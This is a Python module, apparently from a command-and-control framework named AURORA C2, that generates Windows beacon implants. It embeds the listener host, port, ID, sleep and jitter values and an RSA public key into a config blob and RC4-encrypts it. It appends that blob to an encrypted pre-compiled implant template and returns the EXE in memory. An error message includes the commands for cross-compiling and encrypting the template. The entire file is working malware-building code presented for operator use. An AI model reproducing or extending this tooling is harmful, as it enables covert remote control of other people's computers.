# pyright: reportImplicitRelativeImport=false
"""
AURORA C2 - Payload builder.

Generates beacon payloads by:
  1. Reading listener config from the database
  2. Reading RSA public key from the profile's private key
  3. Building a PAYLOAD_CONFIG struct
  4. Appending the config to a pre-compiled beacon template
  5. Returning the final EXE

The beacon template is stored encrypted in resources/. At build time
it is decrypted in memory, the config is appended, and the result is
returned to the operator — never written to disk.

If the template doesn't exist yet, this module can optionally compile
it from implant/ source using the cross-compiler specified in the profile.
"""
from __future__ import annotations

import os
import struct
from pathlib import Path
from typing import Any, Optional

from Crypto.PublicKey import RSA

import config
import database as db
from app_state import get_conn
from resource_manager import has_resource, list_resources, load_resource, load_rsa_private_key_pem

ROOT_DIR = Path(__file__).resolve().parent.parent

TEMPLATE_NAME = "beacon_template_x64"
CONFIG_MAGIC = 0x4f525541  # "AURO"
CONFIG_KEY_SIZE = 32

class PayloadError(Exception):
    pass


def _rc4_crypt(key: bytes, data: bytes) -> bytes:
    """RC4 stream cipher (encrypt = decrypt)."""
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(len(data))
    i = j = 0
    for n in range(len(data)):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[n] = data[n] ^ s[(s[i] + s[j]) & 0xFF]
    return bytes(out)


def _get_rsa_public_pem() -> bytes:
    """Read RSA private key from encrypted resources and export the public key PEM."""
    pem_bytes = load_rsa_private_key_pem()
    rsa_key = RSA.import_key(pem_bytes)
    return rsa_key.publickey().export_key(format="PEM")


def _build_config(listener: dict[str, Any], sleep: int, jitter: int) -> bytes:
    """Build an encrypted PAYLOAD_CONFIG blob (matches implant/payload_config.h).

    Plaintext layout (packed, little-endian, 4399 bytes):
      [4]  magic
      [256] server_host (NUL-padded)
      [2]  server_port
      [33] listener_id (NUL-padded)
      [4]  initial_sleep
      [4]  initial_jitter
      [4096] rsa_public_key_pem (NUL-padded)

    Encrypted output (4431 bytes):
      [32]   random RC4 key
      [4399] RC4(key, plaintext)
    """
    pub_pem = _get_rsa_public_pem()

    # Build plaintext PAYLOAD_CONFIG
    buf = bytearray()
    buf += struct.pack("<I", CONFIG_MAGIC)
    buf += listener["public_host"].encode("utf-8")[:255].ljust(256, b"\x00")
    buf += struct.pack("<H", int(listener["public_port"]))
    buf += listener["id"].encode("utf-8")[:32].ljust(33, b"\x00")
    buf += struct.pack("<II", sleep, jitter)
    buf += pub_pem[:4095].ljust(4096, b"\x00")
    plaintext = bytes(buf)

    # RC4 encrypt with a fresh random key
    rc4_key = os.urandom(CONFIG_KEY_SIZE)
    ciphertext = _rc4_crypt(rc4_key, plaintext)

    return rc4_key + ciphertext


def _get_template() -> bytes:
    """Get the pre-compiled beacon template (decrypted from resources/)."""
    if has_resource(TEMPLATE_NAME):
        return load_resource(TEMPLATE_NAME)

    raise PayloadError(
        f"Beacon template not found in resources/{TEMPLATE_NAME}.enc.\n"
        f"Build it first:\n"
        f"  cd implant && make template CROSS=x86_64-w64-mingw32-\n"
        f"Then encrypt it:\n"
        f"  python teamserver/encrypt_resources.py encrypt beacon_template_x64"
    )


def generate_beacon(
    listener_id: str,
    sleep: Optional[int] = None,
    jitter: Optional[int] = None,
) -> bytes:
    """Generate a complete beacon EXE with embedded config.

    Args:
        listener_id: Database listener ID to embed.
        sleep: Override sleep (seconds). Defaults to profile value.
        jitter: Override jitter (percent). Defaults to profile value.

    Returns:
        Raw EXE bytes (template + PAYLOAD_CONFIG appended at end).

    Raises:
        PayloadError: If listener not found, template missing, etc.
    """
    conn = get_conn()
    listener = db.get_listener(conn, listener_id)
    if not listener:
        raise PayloadError(f"Listener not found: {listener_id}")

    s = sleep if sleep is not None else config.DEFAULT_SLEEP
    j = jitter if jitter is not None else config.DEFAULT_JITTER

    config_blob = _build_config(listener, s, j)
    template = _get_template()

    # Append encrypted config — beacon reads last PAYLOAD_CONFIG_ENC_SIZE bytes
    payload = template + config_blob

    db.log_event(
        conn, "WARN",
        f"Payload generated: listener={listener_id} sleep={s} jitter={j} "
        f"size={len(payload)}",
    )
    return payload


def get_template_info() -> dict[str, object]:
    """Return info about the beacon template (for UI display)."""
    resources: list[str] = []
    try:
        resources = list_resources()
    except Exception:
        pass
    return {
        "template_available": has_resource(TEMPLATE_NAME),
        "template_name": TEMPLATE_NAME,
        "resources": resources,
    }
